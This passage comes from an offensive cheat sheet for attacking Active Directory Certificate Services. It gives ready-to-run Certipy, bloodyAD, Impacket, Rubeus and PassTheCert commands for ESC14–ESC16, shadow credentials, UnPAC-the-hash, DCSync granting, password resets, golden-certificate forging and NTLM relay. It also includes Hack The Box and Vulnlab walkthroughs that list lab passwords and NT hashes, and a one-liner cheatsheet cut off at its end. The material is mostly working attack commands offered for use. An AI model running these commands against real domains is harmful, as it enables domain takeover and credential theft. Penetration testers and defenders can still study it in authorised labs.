**Conditions:** Write-access to `altSecurityIdentities` on target, OR existing weak mapping (RFC822/SubjectOnly/IssuerSubject).

**Mapping formats:**
```
X509:<I>IssuerDN<S>SubjectDN              # weak (Issuer+Subject)
X509:<I>IssuerDN<SR>ReversedSerial        # strong (Issuer+SerialNumber)
X509:<SKI>HashHex                          # strong
X509:<SHA1-PUKEY>HashHex                   # strong
X509:<RFC822>email@x                      # weak
X509:<S>SubjectDN                         # weak
```

## 15.1 Scenario A — write altSecurityIdentities
```bash
# 1) Get a cert (any source — request as ourselves, machine acct, etc.)
certipy req -u 'EVILPC$' -p 'Pass!' -ca corp-CA -template Machine

# 2) Extract Issuer + reversed serial
certipy cert -pfx EVILPC.pfx -nokey -out EVILPC.crt
openssl x509 -in EVILPC.crt -noout -text | grep -E 'Issuer|Serial'

# 3) Write the mapping to target
bloodyAD --host dc01 -d corp.local -u attacker -p 'Pass!' \
    set object 'CN=khal.drogo,CN=Users,DC=corp,DC=local' altSecurityIdentities \
    -v 'X509:<I>DC=local,DC=corp,CN=corp-CA<SR>110000000000a68816e592b078921100000043'

# 4) Auth via Schannel (strong-mapping enforced for Kerberos in patched envs)
certipy auth -pfx EVILPC.pfx -dc-ip 10.0.0.10 -ldap-shell -user khal.drogo -domain corp.local
```

## 15.2 Scenario B — existing X509RFC822 mapping; write target's mail
```bash
bloodyAD --host dc01 -d corp.local -u attacker -p pass set object OurVictim mail -v 'victim_email@corp.local'
certipy req -u OurVictim -p victimpass -ca corp-CA -template User    # template embeds .mail
certipy auth -pfx OurVictim.pfx -dc-ip 10.0.0.10 -user target -domain corp.local
```

## 15.3 Stifle (Windows / C#)
```
Stifle.exe add /object:target /certificate:<base64> /password:Pass
Stifle.exe clear /object:target
```

---

# PART 16 — ESC15: SchemaVersion 1 Application Policies (EKUwu / CVE-2024-49019)

**Conditions:** Template has `msPKI-Template-Schema-Version=1`, `Enrollee Supplies Subject` flag set, attacker has Enroll, CA unpatched (Nov 2024 patch). Default vulnerable: WebServer, CrossCertificationAuthority, etc.

## 16.1 Path A — Direct Client Auth Injection
```bash
certipy req -u attacker -p 'Pass!' -dc-ip 10.0.0.10 -target ca.corp.local \
    -ca corp-CA -template WebServer \
    -upn 'administrator@corp.local' \
    -application-policies 'Client Authentication'
# OR by OID:
certipy req ... -application-policies '1.3.6.1.5.5.7.3.2'
# Multiple:
certipy req ... -application-policies 'Client Authentication' 'Smart Card Logon'
# Strong-mapping environments:
certipy req ... -upn administrator@corp.local -sid 'S-1-5-21-...-500' -application-policies 'Client Authentication'
certipy auth -pfx administrator.pfx
```

## 16.2 Path B — Cert Request Agent injection (chains into ESC3)
```bash
certipy req -u attacker -p 'Pass!' -ca corp-CA -template WebServer \
    -application-policies '1.3.6.1.4.1.311.20.2.1'    # Cert Request Agent
certipy req -u attacker -p 'Pass!' -ca corp-CA -template User \
    -pfx attacker.pfx -on-behalf-of 'CORP\administrator'
certipy auth -pfx administrator.pfx
```

## 16.3 Windows / Metasploit
```cmd
Certify.exe request /ca:DC01\corp-CA /template:WebServer /altname:administrator@corp.local /application-policies:ClientAuthentication
```

---

# PART 17 — ESC16: Security Extension Disabled Domain-Wide

**Conditions:** CA has `1.3.6.1.4.1.311.25.2` in `policy\DisableExtensionList` → ALL issued certs lack SID extension. DC `StrongCertificateBindingEnforcement < 2`. More permissive than ESC9 — affects every template.

## 17.1 Detection
```bash
certipy find -u user -p 'Pass' -dc-ip 10.0.0.10 -vulnerable -stdout
# Look for: Disabled Extensions: 1.3.6.1.4.1.311.25.2
```
```cmd
certutil -config "CA01\corp-CA" -getreg policy\DisableExtensionList
```

## 17.2 Full ESC16 workflow
```bash
# 1) Read victim UPN (save for restore)
certipy account read -u attacker -p 'Pass!' -dc-ip 10.0.0.10 -user victim_svc

# 2) Update victim's UPN to administrator (no @domain)
certipy account update -u attacker -p 'Pass!' -dc-ip 10.0.0.10 -user victim_svc -upn administrator

# 3) (Optional) Get victim TGT via shadow creds
certipy shadow auto -u attacker -p 'Pass!' -dc-ip 10.0.0.10 -account victim_svc

# 4) Request cert as victim from any client-auth template
certipy req -u victim_svc -hashes :HASH -dc-ip 10.0.0.10 -target ca.corp.local \
    -ca corp-CA -template User

# 5) Restore UPN
certipy account update -u attacker -p 'Pass!' -dc-ip 10.0.0.10 -user victim_svc -upn victim_svc@corp.local

# 6) Auth as administrator
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10 -username administrator -domain corp.local
```

---

# PART 18 — SHADOW CREDENTIALS

**Concept:** Write `msDS-KeyCredentialLink` on target (need GenericWrite/GenericAll/AddKeyCredentialLink). Embed your public key, then PKINIT in as them. Requires DC functional level 2016+. BH edge: `AddKeyCredentialLink`.

## 18.1 Certipy (preferred)
```bash
# One-shot: add → auth → UnPAC hash → cleanup
certipy shadow auto -u attacker@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -account VICTIM
certipy shadow auto -u attacker@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -account 'DC01$'

# Manual / persistent
certipy shadow add    -u attacker -p 'Pass!' -dc-ip 10.0.0.10 -account VICTIM -out persist
certipy shadow list   -u attacker -p 'Pass!' -dc-ip 10.0.0.10 -account VICTIM
certipy shadow info   -u attacker -p 'Pass!' -dc-ip 10.0.0.10 -account VICTIM -device-id <GUID>
certipy shadow remove -u attacker -p 'Pass!' -dc-ip 10.0.0.10 -account VICTIM -device-id <GUID>
certipy shadow clear  -u attacker -p 'Pass!' -dc-ip 10.0.0.10 -account VICTIM   # DESTRUCTIVE
```

## 18.2 pywhisker + PKINITtools chain
```bash
python3 pywhisker.py -d corp.local -u attacker -p 'Pass!' --target VICTIM --action add -e PFX -P PfxPass -f victim
python3 gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass PfxPass corp.local/VICTIM victim.ccache
export KRB5CCNAME=victim.ccache
python3 getnthash.py -key <AS_REP_HEX> corp.local/VICTIM     # NT hash
```

## 18.3 bloodyAD / Whisker.exe / ntlmrelayx
```bash
bloodyAD -u attacker -p 'Pass!' -d corp.local --host 10.0.0.10 add shadowCredentials VICTIM
# Relay shadow creds:
ntlmrelayx.py -t ldaps://dc01 --shadow-credentials --shadow-target 'DC01$' --no-http-server -smb2support
```
```cmd
Whisker.exe add /target:VICTIM /domain:corp.local /dc:dc01 /path:out.pfx /password:Pass
```

---

# PART 19 — UnPAC-the-Hash

```bash
# Method 1: certipy automatic (default behavior of `auth`)
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
# Skip UnPAC: -no-hash. Don't save ccache: -no-save. Save kirbi: -kirbi.

# Method 2: PKINITtools manual
python3 gettgtpkinit.py -cert-pfx user.pfx corp.local/user user.ccache
# Note printed AS-REP encryption key
export KRB5CCNAME=$(pwd)/user.ccache
python3 getnthash.py -key <AS_REP_HEX> corp.local/user
```
```cmd
:: Method 3: Rubeus on Windows
Rubeus.exe asktgt /user:USER /certificate:user.pfx /password:PfxPass /domain:corp.local /dc:dc01.corp.local /getcredentials /show /nowrap
```

---

# PART 20 — PASSTHECERT (PKINIT FALLBACK)

**Use when:** `KDC_ERR_PADATA_TYPE_NOSUPP` (DC has no PKINIT cert) — Schannel-LDAPS bind instead of Kerberos.

```bash
# Convert PFX
certipy cert -pfx user.pfx -nokey  -out user.crt
certipy cert -pfx user.pfx -nocert -out user.key

# Available actions: add_computer, del_computer, modify_computer,
#   read_rbcd, write_rbcd, remove_rbcd, flush_rbcd, modify_user, whoami, ldap-shell

# Sanity check
python3 passthecert.py -action whoami -crt user.crt -key user.key -domain corp.local -dc-ip 10.0.0.10

# Interactive LDAP shell
python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain corp.local -dc-ip 10.0.0.10

# Grant DCSync to attacker
python3 passthecert.py -action modify_user -crt user.crt -key user.key \
    -domain corp.local -dc-ip 10.0.0.10 -target attacker -elevate

# Add computer
python3 passthecert.py -action add_computer -crt user.crt -key user.key \
    -domain corp.local -dc-ip 10.0.0.10 -computer-name 'EVIL$' -computer-pass 'EvilP@ss'

# Reset password
python3 passthecert.py -action modify_user -crt user.crt -key user.key \
    -domain corp.local -dc-ip 10.0.0.10 -target victim -new-pass 'NewP@ss!'

# RBCD
python3 passthecert.py -action write_rbcd -crt user.crt -key user.key \
    -domain corp.local -dc-ip 10.0.0.10 -delegate-from 'EVIL$' -delegate-to 'TARGET$'
```
**LDAP shell built-ins:** `add_user/add_computer/add_user_to_group/change_password/clear_rbcd/disable_account/enable_account/get_user_groups/get_laps_password/grant_control/set_dontreqpreauth/set_rbcd/write_gpo_dacl/whoami`.

**C# variant:**
```
PassTheCert.exe --server dc01.corp.local --cert-path admin.pfx --elevate --target "DC=corp,DC=local" --sid <attacker_sid>
PassTheCert.exe --server dc01.corp.local --cert-path admin.pfx --add-computer --computer-name EVIL$ --computer-password Pass
PassTheCert.exe --server dc01.corp.local --cert-path admin.pfx --rbcd --target DC01$ --sid <attacker_sid>
```
**Cleaner alternative:** `certipy auth -pfx admin.pfx -dc-ip 10.0.0.10 -ldap-shell` — same shell, no PFX conversion needed.

---

# PART 21 — CERT FORMAT CONVERSIONS

```bash
# PFX → PEM combined (no encryption)
openssl pkcs12 -in cert.pfx -out cert.pem -nodes

# PFX → cert + key separately
openssl pkcs12 -in cert.pfx -nokeys  -out cert.crt
openssl pkcs12 -in cert.pfx -nocerts -nodes -out key.pem

# PEM → PFX (Microsoft-compatible CSP — REQUIRED for Rubeus)
openssl pkcs12 -in combined.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# OpenSSL 3 legacy fallback:
openssl pkcs12 -legacy -in cert.pfx -out cert.pem -nodes
openssl pkcs12 -legacy -export -in cert.crt -inkey key.pem -out cert.pfx

# Strip / change PFX password
openssl pkcs12 -in cert.pfx -out tmp.pem -nodes -passin pass:OldPass
openssl pkcs12 -export -in tmp.pem -out new.pfx -passout pass:           # empty password

# Base64 (for Rubeus / ntlmrelayx output)
cat cert.pfx | base64 -w0 > cert.b64
echo '<BASE64>' | base64 -d > cert.pfx

# Certipy native (cleanest)
certipy cert -pfx user.pfx -nokey  -out user.crt
certipy cert -pfx user.pfx -nocert -out user.key
certipy cert -pfx in.pfx -password OldPass -export -out out.pfx
certipy cert -pfx user.pfx -text                              # dump cert info
```

---

# PART 22 — PKINIT TROUBLESHOOTING MATRIX

| Error | Cause | Fix |
|---|---|---|
| `KDC_ERR_PADATA_TYPE_NOSUPP` (Error 16) | DC has no PKINIT cert | `certipy auth -ldap-shell` OR PassTheCert |
| `KDC_ERR_CLIENT_NOT_TRUSTED` (800B0112) | CA not in NTAuth, or stale registry, or **clock skew misreported** | Verify `certutil -viewstore -enterprise NTAuth` on DC; **always sync time first** |
| `KRB_AP_ERR_SKEW` ("Clock skew too great") | Drift > 5 min | `sudo ntpdate -u DC_IP` / `sudo rdate -n DC_IP` / `faketime "$(rdate -np DC_IP)" certipy ...` |
| `KDC_ERR_CERTIFICATE_MISMATCH` | KB5014754 Full Enforcement, no SID ext | Add `-sid` to `certipy req`, or chain ESC9/16/14 |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Wrong UPN/realm casing, missing `$` for computers | Verify with `certipy cert -pfx -text` |
| `KDC_ERR_WRONG_REALM` | Cross-forest mismatch | Match cert UPN realm exactly |
| `Cannot find KDC for requested realm` | DNS fails | `/etc/hosts`: `10.0.0.10 dc01.corp.local corp.local CORP.LOCAL` |
| `Object SID mismatch` | Strong mapping enforced | `-sid` flag with correct SID |
| `LDAP strongerAuthRequired` | LDAPS channel binding required | `-no-ldap-channel-binding -no-ldap-signing` (or `pipx inject --force certipy-ad git+https://github.com/ly4k/ldap3`) |
| `unsupported algorithm` on PFX | OpenSSL 3 vs legacy | Add `-legacy` to openssl |
| `CA_MD_TOO_WEAK` (Schannel) | Weak crypto | `OPENSSL_CONF=/path/to/openssl.cnf` with `SECLEVEL=0` |
| `LDAPSocketOpenError` on 636 | LDAPS unavailable | Try port 389 with StartTLS: `-port 389` |

**Time sync recipes:**
```bash
sudo ntpdate -u <DC_IP>
sudo rdate -n <DC_IP>
sudo chronyd -q "server <DC_IP> iburst"
faketime "$(rdate -p -n DC_IP | awk '{print $4,$5}')" certipy auth -pfx user.pfx
faketime '2025-08-12 21:06:29' certipy req ...           # explicit timestamp
```
**krb5.conf template:**
```
[libdefaults]
  default_realm = CORP.LOCAL
[realms]
  CORP.LOCAL = { kdc = dc01.corp.local }
[domain_realm]
  .corp.local = CORP.LOCAL
```

---

# PART 23 — MACHINE WALKTHROUGHS

## 23.1 HTB Escape (10.10.11.202) — ESC1 | CA: `sequel-DC-CA` | Template: `UserAuthentication`
```bash
# Anonymous SMB → Public.pdf has PublicUser:GuestUserCantWrite1
smbclient -N //10.10.11.202/Public
impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.10.11.202 -windows-auth
SQL> EXEC xp_dirtree '\\10.10.14.5\share', 1, 1
sudo responder -I tun0      # captures sql_svc NetNTLMv2
hashcat -m 5600 sql_svc.hash rockyou.txt    # → REGGIE1234ronnie
# WinRM as sql_svc → ERRORLOG.BAK has ryan.cooper:NuclearMosquito3

certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -vulnerable -stdout
certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb \
    -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb
sudo ntpdate -u sequel.htb     # CRITICAL clock sync
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202
evil-winrm -i 10.10.11.202 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
```

## 23.2 HTB Manager (10.10.11.236) — ESC7 | CA: `manager-DC01-CA` | Template: `SubCA`
```bash
nxc smb 10.10.11.236 -u guest -p '' --rid-brute 10000
nxc smb 10.10.11.236 -u users.txt -p users.txt --no-bruteforce --continue-on-success    # operator:operator
impacket-mssqlclient operator:operator@10.10.11.236 -windows-auth
SQL> EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1
# Download website-backup-27-07-23-old.zip → web.config has raven:R4v3nBe5tD3veloP3r!123

certipy ca -ca 'manager-DC01-CA' -add-officer raven -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb \
    -template SubCA -upn administrator@manager.htb       # → Request ID 13, 13.key saved
certipy ca -ca 'manager-DC01-CA' -issue-request 13 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 13
sudo ntpdate manager.htb
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
```

## 23.3 HTB Certified (10.10.11.41) — ESC9 | CA: `certified-DC01-CA` | Template: `CertifiedAuthentication`
```bash
# judith.mader:judith09 → BloodHound: WriteOwner on Management
python3 owneredit.py -action write -new-owner judith.mader -target Management \
    -dc-ip 10.10.11.41 'certified.htb/judith.mader:judith09'
python3 dacledit.py -action write -rights WriteMembers -principal judith.mader \
    -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' \
    -dc-ip 10.10.11.41 'certified.htb/judith.mader:judith09'
net rpc group addmem "Management" judith.mader -U 'certified.htb/judith.mader%judith09' -S dc01.certified.htb

certipy shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc -dc-ip 10.10.11.41
# → management_svc :a091c1832bcdd4677c28b5a6a1295584
certipy shadow auto -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.10.11.41
# → ca_operator :b4b86f45c6018f1b664f70805f45d8f2

certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 \
    -user ca_operator -upn Administrator -dc-ip 10.10.11.41
certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 \
    -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 \
    -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
```

## 23.4 HTB EscapeTwo (10.10.11.51) — ESC4→ESC1 | CA: `sequel-DC01-CA` | Template: `DunderMifflinAuthentication`
```bash
# rose:KxEPkKe6R8su (assumed breach) → MSSQL via XLSX → sa:MSSQL_P@ssw0rd! → ryan via reuse
certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.10.11.51
# ca_svc :3b181b914e7a9d5508ea1e20bc2b7fce

certipy template -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
    -dc-ip 10.10.11.51 -target dc01.sequel.htb -template DunderMifflinAuthentication -save-old
certipy req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
    -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 \
    -template DunderMifflinAuthentication -upn administrator@sequel.htb
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51

# Restore (OPSEC):
certipy template -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
    -dc-ip 10.10.11.51 -target dc01.sequel.htb \
    -template DunderMifflinAuthentication -write-configuration DunderMifflinAuthentication.json
```

## 23.5 HTB Authority (10.10.11.222) — ESC1+MAQ | CA: `AUTHORITY-CA` | Template: `CorpVPN`
```bash
# SMB Development → ansible vault → john ansible2john → PWM admin → LDAP cleartext
sudo responder -I tun0      # captures svc_ldap:lDaP_1n_th3_cle4r!
nxc ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq    # MAQ=10

impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' \
    -method LDAPS -computer-name 0xdf -computer-pass 0xdf0xdf0xdf -dc-ip 10.10.11.222
certipy req -u '0xdf$' -p 0xdf0xdf0xdf -ca AUTHORITY-CA -dc-ip 10.10.11.222 \
    -template CorpVPN -upn administrator@authority.htb -dns authority.htb

# PKINIT FAILS (KDC_ERR_PADATA_TYPE_NOSUPP) → use Schannel
certipy cert -pfx administrator.pfx -nocert -out admin.key
certipy cert -pfx administrator.pfx -nokey -out admin.crt
python3 PassTheCert/Python/passthecert.py -action ldap-shell \
    -crt admin.crt -key admin.key -domain authority.htb -dc-ip 10.10.11.222
# > add_user_to_group svc_ldap "Domain Admins"
```

## 23.6 HTB Fluffy — ESC16 | CA: `fluffy-DC01-CA` | Template: `User` (any)
```bash
# CVE-2025-24071 .library-ms in IT$ share → Responder NTLMv2 → p.agila:prometheusx-303
bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p prometheusx-303 \
    add groupMember 'Service Accounts' p.agila

faketime "$(ntpdate -q 10.10.11.69 | cut -d ' ' -f 1,2)" \
  certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -account ca_svc
# ca_svc :ca0f4f9e9eb8a092addf53bb03fc98c8

faketime "$(ntpdate -q 10.10.11.69 | cut -d ' ' -f 1,2)" \
  certipy account update -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 \
  -user ca_svc -upn administrator
faketime "$(ntpdate -q 10.10.11.69 | cut -d ' ' -f 1,2)" \
  certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 \
  -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
faketime "$(ntpdate -q 10.10.11.69 | cut -d ' ' -f 1,2)" \
  certipy account update -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 \
  -user ca_svc -upn ca_svc@fluffy.htb
faketime "$(ntpdate -q 10.10.11.69 | cut -d ' ' -f 1,2)" \
  certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username Administrator -domain fluffy.htb
# admin :8da83a3fa618b6e3a00e93f676c92a6e
evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```
**`certipy ≥ 5.0.0` REQUIRED** for ESC16 detection. Faketime mandatory.

## 23.7 HTB TombWatcher — ESC15 (EKUwu) | CA: `tombwatcher-CA-1` | Template: `WebServer`
```bash
# After AD Recycle Bin restore of cert_admin and password reset to Maveric#!$!$!!
certipy find -target dc01.tombwatcher.htb -u cert_admin -p 'Maveric#!$!$!!' -vulnerable -stdout

# Path B (preferred — chains into ESC3)
certipy req -u cert_admin -p 'Maveric#!$!$!!' -dc-ip 10.10.11.72 \
    -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer \
    -application-policies 'Certificate Request Agent'
certipy req -u cert_admin -p 'Maveric#!$!$!!' -dc-ip 10.10.11.72 \
    -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User \
    -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
```
**AD Recycle Bin restore:**
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Property objectSid,lastKnownParent
Restore-ADObject -Identity <GUID>
Enable-ADAccount -Identity cert_admin
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Maveric#!\$!\$!!" -AsPlainText -Force)
```

## 23.8 Vulnlab Sendai — ESC4→ESC1 | CA: `sendai-DC-CA` | Template: `SendaiComputer`
```bash
# Password spray Clifford.Davey:RFmoB2WplgE_3p; ca-operators FullControl on SendaiComputer template
certipy template -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.10.x.x \
    -template SendaiComputer -write-default-configuration
nxc ldap dc.sendai.vl -u clifford.davey -p RFmoB2WplgE_3p --get-sid    # +500 = admin SID
certipy req -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.10.x.x \
    -ca sendai-DC-CA -target dc.sendai.vl -template SendaiComputer \
    -upn Administrator@sendai.vl -sid 'S-1-5-21-...-500'
certipy auth -pfx administrator.pfx -dc-ip 10.10.x.x
```

## 23.9 HTB Search — Client cert auth (no ESC)
PFX `staff.pfx` extracted from SMB → cracked with `pfx2john` (password `misspissy`) → imported into Firefox → PSWA shell at `https://research.search.htb/PSWA`. Pure client-cert auth, not ESC.

## 23.10 HTB Cascade — `cascadeLegacyPwd` LDAP attribute (no ADCS)
Anonymous LDAP exposes `cascadeLegacyPwd` (custom attribute, base64) on `r.thompson` → `rY4n5eva`. Not ADCS.

## 23.11 HTB Coder — ESC4 alt (PSPKI New-ADCSTemplate)
```powershell
# As e.black (PKI Admins) on box:
import-module .\ADCSTemplate.psm1
New-ADCSTemplate -DisplayName ESC -JSON (Get-Content .\ESC1.json -Raw) -Publish -Identity "CODER.HTB\PKI Admins"
```
```bash
certipy req -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300 \
    -ca "coder-DC01-CA" -target 10.10.11.207 \
    -template ESC -upn administrator@coder.htb -dns dc01.coder.htb
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.207
```

## 23.12 HTB Certificate (10.10.11.71) — ESC3+Golden Cert | CA: `Certificate-LTD-CA`
```bash
# Lion.SK:!QAZ2wsx (Domain CRA Managers) via PCAP Kerberos crack
certipy req -u Lion.SK -p '!QAZ2wsx' -target certificate.htb -ca Certificate-LTD-CA -template Delegated-CRA
certipy req -u lion.sk@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 \
    -target dc01.certificate.htb -ca Certificate-LTD-CA -template SignedUser \
    -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\ryan.k'
certipy auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
# ryan.k has SeManageVolumePrivilege → extract CA key:
# certutil -exportPFX <SERIAL> .\ca.pfx MY → download
certipy forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb'
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.11.71
```

## 23.13 HTB Scepter — ESC14 (altSecurityIdentities)
```bash
# d.baker has password-reset on a.carter; a.carter has WriteProperty(mail) on d.baker
# h.brown's altSecurityIdentities = X509:<RFC822>h.brown@scepter.htb
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p Welcome1 \
    set object d.baker mail -v h.brown@scepter.htb
certipy req -u d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce \
    -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.10.11.65
certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username h.brown
```

## 23.14 PG Nagoya — Silver Ticket (no real ADCS)
```bash
impacket-lookupsid 'nagoya-industries.com/fiona.clark:Summer2023'@10.10.x.x   # → domain SID
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C \
    -domain-sid <SID> -domain nagoya-industries.com \
    -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k nagoya.nagoya-industries.com
```

## 23.15 Vulnlab Hybrid — ESC1 with extracted machine acct | CA: `hybrid-DC01-CA` | Template: `HYBRIDCOMPUTERS`
```bash
keytabextract krb5.keytab     # → MAIL01$ NT 0f916c5246fdbc7ba95dcef4126d57bd
certipy req -u 'MAIL01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd \
    -dc-ip 10.10.x.x -ca hybrid-DC01-CA -template HYBRIDCOMPUTERS \
    -upn administrator -target dc01.hybrid.vl -key-size 4096
certipy auth -pfx administrator.pfx -username administrator -domain hybrid.vl -dc-ip 10.10.x.x
```

## 23.16 HTB/Vulnlab Retro — ESC1 pre-Win2K computer | CA: `retro-DC-CA` | Template: `RetroClients`
```bash
# Pre-Win2K machine acct: BANKING / banking (lowercase samaccountname, no $)
impacket-getTGT 'retro.vl/BANKING$:banking' -dc-ip 10.10.x.x
nxc ldap dc -u 'BANKING$' -p 'Password123' --get-sid
certipy req -u 'BANKING$' -p 'Password123' -dc-ip 10.10.x.x \
    -ca retro-DC-CA -target dc.retro.vl -template RetroClients \
    -upn administrator@retro.vl -sid 'S-1-5-21-...-500' -key-size 4096
certipy auth -pfx administrator.pfx -username Administrator -domain retro.vl -dc-ip 10.10.x.x
```

---

# PART 24 — MASTER ONE-LINER CHEATSHEET

```bash
# ENUMERATION
certipy find -u U -p P -dc-ip IP -vulnerable -enabled -stdout

# ESC1 / ESC6 / ESC15 / ESC16 (variants on req+auth)
certipy req  -u U -p P -dc-ip IP -ca CA -template T -upn admin@dom -sid S-...-500
certipy req  -u U -p P -dc-ip IP -ca CA -template T -upn admin@dom -application-policies 'Client Authentication'   # ESC15
certipy auth -pfx admin.pfx -dc-ip IP

# ESC2/ESC3
certipy req  -u U -p P -dc-ip IP -ca CA -template AGENT_TPL
certipy req  -u U -p P -dc-ip IP -ca CA -template User -pfx U.pfx -on-behalf-of 'NETBIOS\Administrator'

# ESC4
certipy template -u U -p P -dc-ip IP -template T -save-configuration T.json
certipy template -u U -p P -dc-ip IP -template T -write-default-configuration -force
# ... exploit as ESC1 ...
certipy template -u U -p P -dc-ip IP -template T -write-configuration T.json -no-save

# ESC7
certipy ca -u U -p P -ca CA -target T -add-officer U
certipy ca -u U -p P -ca CA -target T -enable-template SubCA
certipy req -u U -p P -ca CA -target T -template SubCA -upn admin   # → REQ_ID + key
certipy ca -u U -p P -ca CA -target T -issue-request <ID>
certipy req -u U -p P -ca CA -target T -retrieve <ID>

# ESC8
sudo certipy relay -target IP -template DomainController
sudo impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
# + PetitPotam.py / Coercer / printerbug.py / dfscoerce.py

# ESC9 / ESC10 / ESC16
certipy shadow auto -u U -p P -account VICTIM
certipy account update -u U -p P -user VICTIM -upn administrator
certipy req -u VICTIM -hashes :HASH -ca CA -template VULN_TPL
certipy account update -u U -p P -user VICTIM -upn 'VICTIM@corp.local'
certipy auth -pfx admin.pfx -domain corp.local -dc-ip IP -username administrator

# ESC11
sudo certipy relay -target rpc://CA_IP -ca CA -template DomainController -dc-ip DC_IP

# ESC12 (Golden Cert)
certipy ca -backup -u admin -hashes :NT -ca CA -target CA_HOST
certipy forge -ca-pfx CA.pfx -upn admin@dom -sid S-...-500 -crl 'ldap:///'

# ESC14 (altSecIdentities write)
bloodyAD --host DC -d dom -u U -p P set object TARGET altSecurityIdentities -v 'X509:<I>...<SR>...'
certipy auth -pfx user.pfx -dc-ip IP -ldap-shell -user TARGET -domain dom

# Shadow Credentials shortcut
certipy shadow auto -u U -p P -dc-ip IP -account VICTIM

# UnPAC the hash
python3 gettgtpkinit.py -cert-pfx user.pfx dom/user user.ccache
KRB5CCNAME=user.ccache python3 getnthash.py -key <AS_REP_HEX> dom/user

# When PKINIT fails
certipy auth -pfx user.pfx -dc-ip IP -ldap-shell
python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain dom -dc-ip IP
python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain dom -dc-ip IP -target attacker -elevate

# Time sync
sudo ntpdate -u DC_IP || sudo rdate -n DC_IP || faketime "$(rdate -np DC_IP)" certipy ...

# Conversions
openssl pkcs12 -in cert.pfx -out cert.pem -nodes
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
certipy cert -pfx user.pfx -nokey -out user.crt
certipy cert -pfx user.pfx -nocert -out user.key

# Coercion (any of these)
